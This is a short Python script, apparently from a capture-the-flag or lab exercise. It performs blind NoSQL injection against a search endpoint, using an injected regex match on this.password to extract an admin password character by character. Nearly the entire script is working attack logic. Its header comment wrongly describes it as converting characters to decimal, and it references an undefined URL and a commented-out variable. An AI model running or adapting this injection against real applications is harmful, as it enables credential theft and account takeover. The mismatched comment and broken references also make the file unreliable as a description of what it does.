#This script cycle through the input and convert all chars to decimal and add a ", " btwn them
# https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html
# https://cryptii.com/pipes/text-decimal

import urllib.request
import string

whitespace = '\t\n\r\v\f'
ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
ascii_letters = ascii_lowercase + ascii_uppercase
digits = '0123456789'
hexdigits = digits + 'abcdef' + 'ABCDEF'
octdigits = '01234567'
# punctuation = r"""!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""
printable = digits + ascii_letters + punctuation + whitespace


def check(payload):
    url=URL+"/?search=admin%27%20%26%26%20this.password.match(/"+payload+"/)%00"
    #print(url)
    resp = urllib.request.urlopen(url)
    data = resp.read()
    return ">admin<" in str(data)


# print(check("^demo.*$"))
# print(check("^5.*$"))

CHARSET=list("-"+string.ascii_lowercase+string.digits)
password = ""

while True:
    for c in CHARSET:
        print("trying: "+c+" for "+ password)
        test = password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c == CHARSET[-1]:
            print(password)
            exit(0)
            
